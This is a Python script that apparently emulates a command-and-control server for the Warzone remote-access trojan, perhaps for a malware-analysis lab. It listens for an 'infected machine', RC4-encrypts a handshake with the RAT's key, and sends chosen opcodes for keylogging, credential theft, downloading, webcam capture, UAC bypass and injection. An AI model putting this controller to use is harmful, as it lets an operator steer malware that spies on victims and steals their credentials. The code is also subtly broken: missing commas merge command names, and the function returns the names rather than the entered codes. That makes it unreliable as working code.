#!/usr/bin/env python3
#C&C server script for Warzone RAT malware
#This script is meant to be run in conjuction with accept-all-ips.
from socket import *
from art import *
from arc4 import ARC4
import random, string, sys, time, os

commands = ["Keylogger 1", "Process Enumeration", "Drive Informtion",
            "File Enumeration", "Get File Name ??", "Unclear", "Unclear"
            "Unclear", "Unclear", "Remote Webcam", "Remote Webcam 2",
            "Unclear", "Unclear", "ICMP Hole Punching", "Create and Write"
            "Event Handler", "Credential Stealer", "Downloader", "Keylogger 2"
            "Keylogger 3", "Unclear", "Unclear", "Terminate Connection", 
            "Unclear", "Unclear", "Unclear", "Execute File", "Unclear",
            "Not Win10 UAC Bypass", "Win10 UAC Bypass", "Injection", "Unclear"]

def intro():
    tprint('WarzoneCC')
    print('by msaltini \n')

def choices():
    size = input('How many commands do you want to send to the RAT?')
    return size

def list(numInput):
    commandsToSend = []
    print(numInput, type(numInput) is int)

    print("Following are the possible commands that you can run:")
    for i in range(len(commands)):
        print(hex(i * 2), commands[i])
    print("\n")
    
    print("Enter the hex codes for the commands you wish to run.")
    for i in range(numInput):
        hexCode = input("Command: ")
        commandsToSend.append(hexCode)
    

    print("You have entered ", numInput, " commands, time to wait for a response from the rat")
    return commands

def communicate():
    
    serverHost = 'localhost'
    serverPort = 6703
    randomLetter = random.choice(string.ascii_letters)
    arc4 = ARC4('warzone160\x00')

    with socket(AF_INET,SOCK_STREAM) as cc:
        cc.bind((serverHost, serverPort))
        cc.listen(1)
    
        while True:
            print("Waiting for connection from host")
            (connectionSocket, addr) = cc.accept()
            print("Established connection from infected machine: ", addr)
            bufferSize = choices()
            message = "\xe4\x66\xbb\x29"
            message += "\x00\x00\x00" + bufferSize
            message += str(ord(randomLetter)) * 4
            encrMessage = arc4.encrypt(message)
            print(message, encrMessage)
            connectionSocket.send(encrMessage)

            commands = list(int(bufferSize))
            for i in range(len(commands)):
                if commands[i] == "exit":
                    return
                connectionSocket.send(arc4.encrypt(commands[i]))

            connectionSocket.close()
            print("Connection to host has been closed")


def main():
    intro()
    communicate()

if __name__ == "__main__":
    main()
